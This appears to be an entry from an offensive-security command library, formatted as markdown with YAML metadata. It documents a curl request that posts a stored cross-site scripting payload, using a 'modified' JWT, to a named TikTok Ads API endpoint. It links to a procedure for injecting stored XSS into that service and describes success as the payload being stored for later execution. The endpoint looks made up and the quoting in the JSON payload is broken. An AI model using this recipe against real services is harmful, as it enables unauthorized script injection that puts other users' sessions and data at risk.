---
data: 'curl -H "Authorization: Bearer [jwt]" -d ''[payload]'' [url] -X POST'
tags:
  - xss
  - http
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: ca5deb26-a7c4-430a-86f5-73eb6296c3cf
created_at: '2025-12-11T03:47:56.566Z'
updated_at: '2025-12-11T03:47:56.566Z'
verified: false
validated: true
submitted: true
---
# curl-xss-injection

## Command

```bash
curl -H "Authorization: Bearer [modified-jwt]" -d '{"content": "<script>alert("XSS")</script>"}' https://ads.tiktok.com/api/inject -X POST
```

## Description

This command sends an HTTP POST request with an XSS payload to inject malicious scripts into a vulnerable endpoint.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Authorization: Bearer [jwt]"` | Authorization header | Yes |
| `-d '[payload]'` | Data payload containing XSS | Yes |
| `[url]` | Target injection URL | Yes |

## Examples

### Basic Usage

```bash
curl -d '{"content": "<script>alert(1)</script>"}' https://example.com/api -X POST
```

### Advanced Usage

```bash
curl -H "Content-Type: application/json" -d @payload.json https://example.com/api -X POST
```

## Expected Output

200 OK response if injection succeeds, with the payload stored for later execution.

## Related

- [[commands/curl-jwt-manipulation]]
- [[procedures/Inject-Stored-XSS-via-TikTok-Ads]]
